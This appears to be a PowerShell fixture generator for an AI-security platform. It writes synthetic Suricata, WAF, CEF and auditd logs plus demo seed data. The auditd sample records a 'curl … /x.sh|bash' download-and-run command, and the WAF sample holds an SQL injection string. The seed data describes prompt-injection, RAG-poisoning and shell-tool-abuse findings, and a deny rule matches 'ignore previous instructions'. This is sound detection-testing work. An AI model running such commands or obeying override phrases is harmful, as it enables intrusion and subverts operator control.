#Requires -Version 5.1
<#
.SYNOPSIS
    生成/刷新 AIGuardFabric 演示与测试用的**合成**数据（幂等，带 synthetic=true 标注）。

.DESCRIPTION
    产出三份东西，全部用固定随机种子，重复运行结果**逐字节一致**（幂等）：

      1. tests/fixtures/synthetic/*.log
         合成日志样本（4 类）：Suricata eve.json / 云 WAF webhook JSON / CEF syslog /
         auditd EXECVE。字段名、分隔符、时间戳形态、严重等级枚举都按各产品公开语义，
         但主机名/IP 为示例值（RFC 5737 文档地址段 203.0.113.0/24 与 RFC 1918 私网段）。
         每个文件首行/JSON 内标注 synthetic=true，避免被误当成真实样本。

      2. tests/fixtures/synthetic/manifest.json
         合成样本清单：模板 key、相对路径、synthetic 标志、sha256、期望字段。
         与 tests/fixtures/logs/manifest.json（**真实/离线样本**清单）分开存放，互不覆盖。

      3. data/seed/*.json
         演示数据集：资产 / 风险检出 / 告警 / 案件 / 策略 / 红队用例。
         供 scripts/seed.ps1（灌库）与 scripts/demo.ps1（离线全链路演示）共用。

    以及 tests/fixtures/synthetic/SOURCES.md——说明哪些是合成、合成依据、如何替换为真实样本。

.PARAMETER Force
    即使文件已存在也重写（默认：内容哈希一致则跳过，保持幂等且不无谓改 mtime）。

.PARAMETER WhatIf
    只打印将要写出的文件清单，不落盘。

.PARAMETER Seed
    伪随机种子（默认 20260221）。改这个值会换一套示例取值。

.EXAMPLE
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File scripts\gen-fixtures.ps1

.EXAMPLE
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File scripts\gen-fixtures.ps1 -WhatIf

.NOTES
    退出码：0 = 成功；1 = 失败。
    绝不写入 tests/fixtures/logs/（那是真实/离线核验过的样本目录，由 fetch-fixtures.ps1 管理）。
#>

[CmdletBinding()]
param(
    [switch]$Force,
    [switch]$WhatIf,
    [int]$Seed = 20260221
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$env:AGF_ENV_QUIET = '1'
. "$PSScriptRoot\lib.ps1"

# ---------------------------------------------------------------------------
# 0. 输出位置
# ---------------------------------------------------------------------------
$outDir = Get-AgfPath 'tests\fixtures\synthetic'
$seedDir = Get-AgfPath 'data\seed'
$rng = New-AgfSeededRandom -Seed $Seed

Write-AgfBanner 'AIGuardFabric 合成样本生成（gen-fixtures）'
Write-Host ("  样本目录 : {0}" -f $outDir)
Write-Host ("  演示数据 : {0}" -f $seedDir)
Write-Host ("  伪随机种子: {0}（固定，保证幂等）" -f $Seed)
Write-Host ("  模式     : {0}" -f $(if ($WhatIf) { 'WhatIf（只打印）' } else { '执行' }))
Write-Host ''

$script:Stats = [ordered]@{ written = 0; unchanged = 0; planned = 0 }
$script:Written = New-Object System.Collections.Generic.List[string]

function Publish-AgfFixture {
    <#
    .SYNOPSIS
        写文件（幂等）：内容与磁盘一致则跳过；-Force 则无条件重写。
    #>
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][AllowEmptyString()][string]$Content
    )
    $rel = $Path.Substring($global:AgfRoot.Length + 1)
    $hash = Get-AgfStableHash -Text $Content

    if (Test-Path -LiteralPath $Path) {
        $existing = Get-Content -LiteralPath $Path -Raw -Encoding UTF8
        if ((Get-AgfStableHash -Text $existing) -eq $hash -and -not $Force) {
            $script:Stats.unchanged++
            Write-Host ("  [ = ] {0,-46} 内容一致，跳过" -f $rel) -ForegroundColor DarkGray
            $script:Written.Add($rel)
            return
        }
    }
    if ($WhatIf) {
        $script:Stats.planned++
        Write-Host ("  [ ~ ] {0,-46} [WhatIf] 将写入 {1} 字节 (sha256:{2})" -f $rel, $Content.Length, $hash) -ForegroundColor DarkYellow
        return
    }
    Write-AgfTextFile -Path $Path -Content $Content
    $script:Stats.written++
    Write-Host ("  [ + ] {0,-46} 已写入 {1} 字节 (sha256:{2})" -f $rel, $Content.Length, $hash) -ForegroundColor Green
    $script:Written.Add($rel)
}

# ---------------------------------------------------------------------------
# 1. 合成日志样本（4 类）
#
# 时间戳基准固定为 2026-02-21T10:23:45Z（与 tests/fixtures/logs 既有样本同一"故事日"），
# 便于跨目录对账；取值用固定种子生成，重复运行一致。
# ---------------------------------------------------------------------------
Write-AgfStep '1/5 生成合成日志样本'

$internalHosts = @('app-prod-01', 'ecs-prod-01', 'web-01', 'gw-edge-01', 'k8s-node-07')
$internalIps = @('10.20.30.40', '10.20.30.41', '10.20.30.111', '10.20.30.50', '10.20.30.77')
$attackerIps = @('203.0.113.77', '203.0.113.88', '203.0.113.99', '203.0.113.200', '198.51.100.23')

$hostPick = Get-AgfSeededPick -Random $rng -Items $internalHosts
$ipPick = Get-AgfSeededPick -Random $rng -Items $internalIps
$atkPick = Get-AgfSeededPick -Random $rng -Items $attackerIps

# 1.1 Suricata eve.json（NDJSON，一行一个事件）
$suricataSig = @(
    @{ id = 2001999; name = 'ET MALWARE Win32/Remcos RAT CnC Checkin'; sev = 1 },
    @{ id = 2019401; name = 'ET EXPLOIT Possible Apache Struts2 RCE Attempt'; sev = 1 },
    @{ id = 2027757; name = 'ET POLICY Http Client Body contains passwd= in cleartext'; sev = 2 }
)
$sig = $suricataSig[0]
$suricata = [ordered]@{
    timestamp = '2026-02-21T10:23:45.123456+0800'
    flow_id   = 1234567890
    event_type = 'alert'
    src_ip    = $atkPick
    src_port  = 45123
    dest_ip   = '10.20.30.40'
    dest_port = 8443
    proto     = 'TCP'
    alert     = [ordered]@{
        action       = 'allowed'
        gid          = 1
        signature_id = $sig.id
        rev          = 4
        signature    = $sig.name
        category     = 'A Network Trojan was detected'
        severity     = $sig.sev
    }
    payload_printable = 'R0VUIC8gSFRUUC8xLjENCg=='
    synthetic = $true
    note      = 'AIGuardFabric 合成样本：字段集按 Suricata eve.json 公开格式，取值示例'
}
$suricataJson = ($suricata | ConvertTo-Json -Depth 30)
$suricataJson = [regex]::Replace($suricataJson, '":\s{2,}', '": ')
# NDJSON：压成单行
$suricataLine = ($suricataJson -replace "`r?`n", ' ' -replace '\s{2,}', ' ').Trim()
Publish-AgfFixture -Path (Join-Path $outDir 'suricata-eve-synthetic-1.log') -Content ($suricataLine + "`n")

# 1.2 云 WAF webhook（JSON 单行）
$waf = [ordered]@{
    alertName      = 'SQL 注入攻击'
    alertType      = 'waf'
    level          = 'serious'
    uuid           = '11111111-2222-4333-8444-555555555555'
    instanceName   = $hostPick
    internetIp     = '47.98.12.34'
    intranetIp     = $ipPick
    occurrenceTime = '2026-02-21 10:23:45'
    detail         = ("检测到来自 {0} 的 SQL 注入攻击，已拦截" -f $atkPick)
    region         = 'cn-hangzhou'
    requestUri     = "/api/v1/order?id=1' OR '1'='1"
    action         = 'block'
    synthetic      = $true
}
$wafJson = ($waf | ConvertTo-Json -Depth 30)
$wafJson = [regex]::Replace($wafJson, '":\s{2,}', '": ')
Publish-AgfFixture -Path (Join-Path $outDir 'cloud-waf-webhook-synthetic-1.log') -Content (($wafJson -replace "`r?`n", ' ' -replace '\s{2,}', ' ').Trim() + "`n")

# 1.3 CEF syslog（RFC3164 前缀 + CEF:0|...）
$cef = '<134>Feb 21 10:23:45 ' + $hostPick + ' CEF:0|Sangfor|AF|8.0.17|1001|IPS 攻击 - SQL 注入|5|' +
"src=$atkPick dst=203.0.113.10 spt=54321 dpt=80 proto=TCP act=block cat=入侵检测 " +
'msg=检测到针对 203.0.113.10 的 SQL 注入攻击 request=http://203.0.113.10/login?id=1 synthetic=true'
Publish-AgfFixture -Path (Join-Path $outDir 'cef-ips-synthetic-1.log') -Content ($cef + "`n")

# 1.4 auditd EXECVE（syslog 前缀 + audit 记录）
$auditd = '<38>Feb 21 10:23:49 ' + $hostPick + ' auditd[1120]: type=EXECVE msg=audit(1771674229.123:4567): ' +
'argc=3 a0="sh" a1="-c" a2="curl -s http://' + $atkPick + '/x.sh|bash" uid=0 auid=1000 ses=12 ' +
'comm="sh" exe="/usr/bin/bash" addr=' + $atkPick + ' synthetic=true'
Publish-AgfFixture -Path (Join-Path $outDir 'auditd-execve-synthetic-1.log') -Content ($auditd + "`n")

# ---------------------------------------------------------------------------
# 2. 合成样本清单 manifest.json
# ---------------------------------------------------------------------------
Write-AgfStep '2/5 生成合成样本清单'

$syntheticTemplates = [ordered]@{
    'suricata-eve-synthetic' = [ordered]@{
        fixture    = 'suricata-eve-synthetic-1.log'
        vendor     = 'Suricata'
        product    = 'eve.json'
        protocol   = 'file'
        synthetic  = $true
        severity   = 'critical'
        category   = 'intrusion'
        host       = ''
        ip         = '10.20.30.40'
        note       = '合成：字段集与枚举按 Suricata eve.json 公开格式；数据行为编写示例'
    }
    'cloud-waf-webhook-synthetic' = [ordered]@{
        fixture    = 'cloud-waf-webhook-synthetic-1.log'
        vendor     = 'generic-cloud'
        product    = 'WAF webhook'
        protocol   = 'webhook'
        synthetic  = $true
        severity   = 'high'
        category   = 'web'
        host       = $hostPick
        ip         = $ipPick
        note       = '合成：云 WAF 告警 webhook JSON 常见字段形态；不含真实云账号信息'
    }
    'cef-ips-synthetic' = [ordered]@{
        fixture    = 'cef-ips-synthetic-1.log'
        vendor     = 'generic'
        product    = 'CEF IPS'
        protocol   = 'syslog'
        synthetic  = $true
        severity   = 'high'
        category   = 'intrusion'
        host       = $hostPick
        ip         = $atkPick
        note       = '合成：CEF:0|Vendor|Product|Version|SigID|Name|Severity|Extension 形态'
    }
    'auditd-execve-synthetic' = [ordered]@{
        fixture    = 'auditd-execve-synthetic-1.log'
        vendor     = 'Linux'
        product    = 'auditd'
        protocol   = 'syslog'
        synthetic  = $true
        severity   = 'high'
        category   = 'process'
        host       = $hostPick
        ip         = $atkPick
        note       = '合成：type=EXECVE msg=audit(<epoch>.<ms>:<seq>) 记录形态'
    }
}

$fileHashes = [ordered]@{}
foreach ($key in $syntheticTemplates.Keys) {
    $rel = 'tests/fixtures/synthetic/' + $syntheticTemplates[$key].fixture
    $abs = Join-Path $global:AgfRoot ($rel -replace '/', '\')
    if (Test-Path -LiteralPath $abs) {
        $fileHashes[$rel] = (Get-FileHash -LiteralPath $abs -Algorithm SHA256).Hash.ToLowerInvariant()
    }
    else {
        $fileHashes[$rel] = '<WhatIf：未落盘>'
    }
}

$manifest = [ordered]@{
    version    = 1
    generatedAt = '2026-02-21T10:23:45Z'
    generator  = 'scripts/gen-fixtures.ps1'
    seed       = $Seed
    note       = 'AIGuardFabric **合成**样本清单（synthetic=true）。真实/离线核验样本清单在 tests/fixtures/logs/manifest.json。合成样本仅用于离线开发与门禁，接入上线前必须替换为客户真实日志。'
    sha256     = $fileHashes
    templates  = $syntheticTemplates
}
Publish-AgfFixture -Path (Join-Path $outDir 'manifest.json') -Content (($manifest | ConvertTo-Json -Depth 30) -replace '":\s{2,}', '": ')

# ---------------------------------------------------------------------------
# 3. SOURCES.md（合成依据与替换指引）
# ---------------------------------------------------------------------------
Write-AgfStep '3/5 生成合成样本说明 SOURCES.md'

$sourcesMd = @'
# 合成测试样本来源说明（tests/fixtures/synthetic/SOURCES.md）

> 本目录**全部为合成样本**（`synthetic=true`），由 `scripts/gen-fixtures.ps1` 生成，固定随机种子，
> 重复运行逐字节一致（幂等）。

## 与 tests/fixtures/logs/ 的区别

| 目录 | 内容 | 管理脚本 |
|---|---|---|
| `tests/fixtures/logs/` | 接入模板样本；含 `real`（逐字取自公开来源）与 `synthetic=true` 两类，来源与抓取日期登记在该目录的 `SOURCES.md` | `scripts/fetch-fixtures.ps1` |
| `tests/fixtures/synthetic/`（本目录） | **纯合成**样本，用于离线开发、门禁与 CI，绝不冒充真实样本 | `scripts/gen-fixtures.ps1` |

## 合成依据（格式忠于公开语义，取值是示例）

| 文件 | 形态 | 合成依据 |
|---|---|---|
| `suricata-eve-synthetic-1.log` | NDJSON，`event_type=alert` | Suricata eve.json 公开文档事件字段集：`timestamp/flow_id/event_type/src_ip/src_port/dest_ip/dest_port/proto/alert{action,gid,signature_id,rev,signature,category,severity}`；`alert.severity` 取值 1-4 |
| `cloud-waf-webhook-synthetic-1.log` | 单行 JSON | 云 WAF 告警 webhook 常见字段：`alertName/alertType/level/uuid/instanceName/internetIp/intranetIp/occurrenceTime/detail/region`；`level` 取 serious 等枚举 |
| `cef-ips-synthetic-1.log` | syslog(RFC3164) + CEF:0 | CEF 公开格式 `CEF:0\|Vendor\|Product\|Version\|SignatureID\|Name\|Severity\|Extension`；`sev` 0-10 |
| `auditd-execve-synthetic-1.log` | syslog(RFC3164) + audit | Linux auditd 记录形态 `type=EXECVE msg=audit(<epoch>.<ms>:<seq>): argc=N a0="..." uid=... comm=... exe=... addr=...` |

## 取值约定（避免与现实混淆）

* IP 一律使用**文档地址段**：`203.0.113.0/24`、`198.51.100.0/24`（RFC 5737）与私网段
  `10.20.30.0/24`（RFC 1918）——不对应任何真实资产。
* 时间戳固定故事日 `2026-02-21`，与 `tests/fixtures/logs/` 既有样本同日，便于跨目录对账。
* 每个文件都带 `synthetic=true` 标注（JSON 字段、日志尾部 `synthetic=true`），
  不会与真实样本混淆。

## 替换为真实样本

接入侧上线前必须用**客户真实日志**替换本目录样本，并把上层 `manifest.json` 的
`synthetic` 改为 `false`；采集真实样本请用 `scripts/fetch-fixtures.ps1 -Execute`
抓取公开样本，或由客户提供脱敏日志。
'@
Publish-AgfFixture -Path (Join-Path $outDir 'SOURCES.md') -Content ($sourcesMd -replace "`r?`n", "`n")

# ---------------------------------------------------------------------------
# 4. 演示数据集（data/seed/*.json）
#
# 与 apps/web/src/api/demo/ 的前端内置演示数据同源同量级（资产/检出/告警/案件/策略），
# 但这里是后端可灌库的 JSON；字段命名对齐 deploy/sql/migration_parts/ 中内嵌 0001 的表语义。
# ---------------------------------------------------------------------------
Write-AgfStep '4/5 生成演示数据集 data/seed'

$assets = @(
    [ordered]@{ id = 'ast-agent-0001'; name = '客服智能助手 Copilot'; kind = 'agent'; owner = '刘燕'; department = '客户运营部'; classification = 'confidential'; lifecycle = 'active'; exposure = 'public-internet'; risk_score = 92; open_findings = 3; tags = @('production', 'customer-facing', 'llm') }
    [ordered]@{ id = 'ast-agent-0002'; name = '风控决策 Agent'; kind = 'agent'; owner = '陈昊'; department = '风控科技部'; classification = 'restricted'; lifecycle = 'active'; exposure = 'intranet'; risk_score = 78; open_findings = 2; tags = @('production', 'regulated') }
    [ordered]@{ id = 'ast-model-0001'; name = '信贷评分模型 v3'; kind = 'model'; owner = '赵宁'; department = '风控科技部'; classification = 'restricted'; lifecycle = 'active'; exposure = 'intranet'; risk_score = 71; open_findings = 1; tags = @('production', 'decisioning') }
    [ordered]@{ id = 'ast-mcp-0001'; name = '运维数据查询 MCP'; kind = 'mcp'; owner = '周凯'; department = '基础架构部'; classification = 'internal'; lifecycle = 'active'; exposure = 'intranet'; risk_score = 66; open_findings = 1; tags = @('ops', 'mcp') }
    [ordered]@{ id = 'ast-cred-0001'; name = '生产 K8s kubeconfig'; kind = 'credential'; owner = '周凯'; department = '基础架构部'; classification = 'restricted'; lifecycle = 'active'; exposure = 'intranet'; risk_score = 88; open_findings = 1; tags = @('k8s', 'credential') }
    [ordered]@{ id = 'ast-ds-0001'; name = '客户征信数据源'; kind = 'datasource'; owner = '赵宁'; department = '数据平台部'; classification = 'restricted'; lifecycle = 'active'; exposure = 'intranet'; risk_score = 83; open_findings = 1; tags = @('pii', 'regulated') }
    [ordered]@{ id = 'ast-skill-0001'; name = '财务报销审批 Skill'; kind = 'skill'; owner = '孙琪'; department = '研发效能部'; classification = 'internal'; lifecycle = 'onboarding'; exposure = 'intranet'; risk_score = 44; open_findings = 0; tags = @('internal') }
    [ordered]@{ id = 'ast-agent-0003'; name = '代码评审助手'; kind = 'agent'; owner = '孙琪'; department = '研发效能部'; classification = 'internal'; lifecycle = 'active'; exposure = 'intranet'; risk_score = 54; open_findings = 1; tags = @('devtools') }
)

$findings = @(
    [ordered]@{ id = 'fnd-0001'; asset = '客服智能助手 Copilot'; asset_id = 'ast-agent-0001'; title = '系统提示词可被用户输入覆盖（提示词注入）'; domain = 'runtime'; severity = 'critical'; status = 'open'; rule_id = 'AGF-PROMPT-001'; category = 'prompt-injection'; detected_at = '2026-02-21T10:12:03Z'; source = 'scan'; evidence = 'evidence/demo/fnd-0001.txt'; description = '通过 “忽略以上指令” 类输入可让 Agent 泄露系统提示词全文。' }
    [ordered]@{ id = 'fnd-0002'; asset = '运维数据查询 MCP'; asset_id = 'ast-mcp-0001'; title = '高危工具调用未做参数校验（命令注入）'; domain = 'runtime'; severity = 'critical'; status = 'open'; rule_id = 'AGF-TOOL-007'; category = 'tool-abuse'; detected_at = '2026-02-21T10:14:22Z'; source = 'scan'; evidence = 'evidence/demo/fnd-0002.txt'; description = 'MCP 工具 shell_exec 直接拼接 LLM 输出，可执行任意命令。' }
    [ordered]@{ id = 'fnd-0003'; asset = '生产 K8s kubeconfig'; asset_id = 'ast-cred-0001'; title = '明文凭据出现在 Agent 提示词中'; domain = 'identity'; severity = 'high'; status = 'open'; rule_id = 'AGF-CRED-002'; category = 'credential-leak'; detected_at = '2026-02-21T10:16:40Z'; source = 'ingest'; evidence = 'evidence/demo/fnd-0003.txt'; description = 'Agent 会话上下文中包含 kubeconfig 的 client-key-data。' }
    [ordered]@{ id = 'fnd-0004'; asset = '客户征信数据源'; asset_id = 'ast-ds-0001'; title = 'RAG 知识库投毒：外部文档可写入检索库'; domain = 'data'; severity = 'high'; status = 'open'; rule_id = 'AGF-RAG-003'; category = 'rag-poison'; detected_at = '2026-02-21T10:18:05Z'; source = 'scan'; evidence = 'evidence/demo/fnd-0004.txt'; description = '未校验来源的工单附件会进入向量库，可植入指令。' }
    [ordered]@{ id = 'fnd-0005'; asset = '客服智能助手 Copilot'; asset_id = 'ast-agent-0001'; title = '模型输出包含未脱敏手机号'; domain = 'data'; severity = 'high'; status = 'open'; rule_id = 'AGF-DATA-011'; category = 'model-data'; detected_at = '2026-02-21T10:19:31Z'; source = 'ingest'; evidence = 'evidence/demo/fnd-0005.txt'; description = '响应体中检出 138**** 形态 PII 未脱敏。' }
    [ordered]@{ id = 'fnd-0006'; asset = '信贷评分模型 v3'; asset_id = 'ast-model-0001'; title = '模型端点未鉴权可被外部调用'; domain = 'asset'; severity = 'medium'; status = 'open'; rule_id = 'AGF-ASSET-021'; category = 'exposure'; detected_at = '2026-02-21T10:21:12Z'; source = 'agent-scan'; evidence = 'evidence/demo/fnd-0006.txt'; description = 'inference 端点暴露在内网且无 mTLS。' }
)

$alerts = @(
    [ordered]@{ id = 'alt-0001'; title = '提示词注入尝试：忽略以上指令'; severity = 'critical'; status = 'open'; asset = '客服智能助手 Copilot'; finding_id = 'fnd-0001'; source = 'runtime'; count = 12; first_seen = '2026-02-21T10:12:03Z'; last_seen = '2026-02-21T10:23:45Z' }
    [ordered]@{ id = 'alt-0002'; title = '高危工具调用：shell_exec'; severity = 'critical'; status = 'open'; asset = '运维数据查询 MCP'; finding_id = 'fnd-0002'; source = 'runtime'; count = 3; first_seen = '2026-02-21T10:14:22Z'; last_seen = '2026-02-21T10:22:10Z' }
    [ordered]@{ id = 'alt-0003'; title = '凭据泄露：kubeconfig 明文外发'; severity = 'high'; status = 'acknowledged'; asset = '生产 K8s kubeconfig'; finding_id = 'fnd-0003'; source = 'ingest'; count = 5; first_seen = '2026-02-21T10:16:40Z'; last_seen = '2026-02-21T10:20:02Z' }
    [ordered]@{ id = 'alt-0004'; title = 'RAG 投毒文档入库'; severity = 'high'; status = 'open'; asset = '客户征信数据源'; finding_id = 'fnd-0004'; source = 'ingest'; count = 2; first_seen = '2026-02-21T10:18:05Z'; last_seen = '2026-02-21T10:18:51Z' }
)

$cases = @(
    [ordered]@{ id = 'case-0001'; title = '客服 Copilot 提示词注入事件'; severity = 'critical'; status = 'investigating'; owner = '刘燕'; finding_ids = @('fnd-0001', 'fnd-0005'); alert_ids = @('alt-0001'); opened_at = '2026-02-21T10:25:00Z'; sla_due = '2026-02-21T14:25:00Z' }
    [ordered]@{ id = 'case-0002'; title = 'MCP 高危工具调用阻断验证'; severity = 'critical'; status = 'contained'; owner = '周凯'; finding_ids = @('fnd-0002'); alert_ids = @('alt-0002'); opened_at = '2026-02-21T10:30:00Z'; sla_due = '2026-02-21T14:30:00Z' }
)

$policies = @(
    [ordered]@{ id = 'pol-0001'; name = '拦截提示词注入（AGF-PROMPT-001）'; effect = 'deny'; target = 'runtime.prompt'; status = 'published'; version = 2; rule = 'input matches /忽略(以上|之前)指令|ignore (all )?previous instructions/i'; enforcement = 'block'; created_at = '2026-02-21T09:00:00Z' }
    [ordered]@{ id = 'pol-0002'; name = '高危工具调用需人工审批（AGF-TOOL-007）'; effect = 'require-approval'; target = 'runtime.tool.shell_exec'; status = 'published'; version = 1; rule = 'tool.name == "shell_exec"'; enforcement = 'queue'; created_at = '2026-02-21T09:05:00Z' }
    [ordered]@{ id = 'pol-0003'; name = '模型输出 PII 脱敏（AGF-DATA-011）'; effect = 'redact'; target = 'runtime.response'; status = 'published'; version = 3; rule = 'response matches /\b1[3-9]\d{9}\b/'; enforcement = 'redact'; created_at = '2026-02-21T09:10:00Z' }
)

$redteamCases = @(
    [ordered]@{ id = 'RT-CT-001'; family = 'credential-theft'; title = '系统提示词提取'; severity = 'high'; status = 'blocked-by-policy'; policy_id = 'pol-0001'; attempts = 8 }
    [ordered]@{ id = 'RT-TA-001'; family = 'tool-abuse'; title = 'shell_exec 命令拼接'; severity = 'critical'; status = 'blocked-by-policy'; policy_id = 'pol-0002'; attempts = 4 }
    [ordered]@{ id = 'RT-DI-001'; family = 'direct-injection'; title = '忽略指令直接越权'; severity = 'high'; status = 'passed'; policy_id = ''; attempts = 6 }
)

$fixtureIndex = [ordered]@{
    'tests/fixtures/logs'      = @('suricata-eve-1.log', 'qingteng-hive-1.log', 'aliyun-waf-1.log', 'wazuh-alert-1.log', 'syslog-rfc3164-1.log')
    'tests/fixtures/synthetic' = @('suricata-eve-synthetic-1.log', 'cloud-waf-webhook-synthetic-1.log', 'cef-ips-synthetic-1.log', 'auditd-execve-synthetic-1.log')
}

$seedDatasets = [ordered]@{
    'assets.json'         = [ordered]@{ dataset = 'assets'; synthetic = $true; note = '演示资产（合成）'; count = $assets.Count; items = $assets }
    'findings.json'       = [ordered]@{ dataset = 'findings'; synthetic = $true; note = '演示风险检出（合成）'; count = $findings.Count; items = $findings }
    'alerts.json'         = [ordered]@{ dataset = 'alerts'; synthetic = $true; note = '演示告警（合成）'; count = $alerts.Count; items = $alerts }
    'cases.json'          = [ordered]@{ dataset = 'cases'; synthetic = $true; note = '演示案件（合成）'; count = $cases.Count; items = $cases }
    'policies.json'       = [ordered]@{ dataset = 'policies'; synthetic = $true; note = '演示策略（合成）'; count = $policies.Count; items = $policies }
    'redteam-cases.json'  = [ordered]@{ dataset = 'redteam_cases'; synthetic = $true; note = '演示红队用例结果（合成）'; count = $redteamCases.Count; items = $redteamCases }
}

foreach ($name in $seedDatasets.Keys) {
    Publish-AgfFixture -Path (Join-Path $seedDir $name) -Content (($seedDatasets[$name] | ConvertTo-Json -Depth 30) -replace '":\s{2,}', '": ')
}

$seedIndex = [ordered]@{
    version    = 1
    generatedAt = '2026-02-21T10:23:45Z'
    generator  = 'scripts/gen-fixtures.ps1'
    synthetic  = $true
    note       = '演示数据集索引（合成）。scripts/seed.ps1 按本清单灌库；scripts/demo.ps1 按本清单离线演示。'
    datasets   = @(
        [ordered]@{ name = 'assets'; file = 'assets.json'; table = 'assets'; count = $assets.Count }
        [ordered]@{ name = 'findings'; file = 'findings.json'; table = 'findings'; count = $findings.Count }
        [ordered]@{ name = 'alerts'; file = 'alerts.json'; table = 'alerts'; count = $alerts.Count }
        [ordered]@{ name = 'cases'; file = 'cases.json'; table = 'cases'; count = $cases.Count }
        [ordered]@{ name = 'policies'; file = 'policies.json'; table = 'policies'; count = $policies.Count }
        [ordered]@{ name = 'redteam_cases'; file = 'redteam-cases.json'; table = 'redteam_cases'; count = $redteamCases.Count }
    )
    fixtures   = $fixtureIndex
}
Publish-AgfFixture -Path (Join-Path $seedDir 'index.json') -Content (($seedIndex | ConvertTo-Json -Depth 30) -replace '":\s{2,}', '": ')

# ---------------------------------------------------------------------------
# 5. 汇总
# ---------------------------------------------------------------------------
Write-AgfStep '5/5 汇总'
Write-Host ("  写入 {0} 个 / 跳过 {1} 个（内容一致）{2}" -f $script:Stats.written, $script:Stats.unchanged, $(if ($WhatIf) { " / 计划 $($script:Stats.planned) 个" } else { '' }))
Write-Host ''
if ($WhatIf) {
    Write-AgfInfo 'WhatIf 模式：未落盘。去掉 -WhatIf 执行。'
    exit 0
}
Write-AgfOk '合成样本与演示数据集已就绪。'
Write-Host '  演示数据可直接用于离线演示：powershell.exe -NoProfile -ExecutionPolicy Bypass -File scripts\demo.ps1' -ForegroundColor DarkGray
Write-Host '  灌库请用：scripts\seed.ps1（agf-cli seed 子命令尚未实现时会明确报告并降级）' -ForegroundColor DarkGray
exit 0
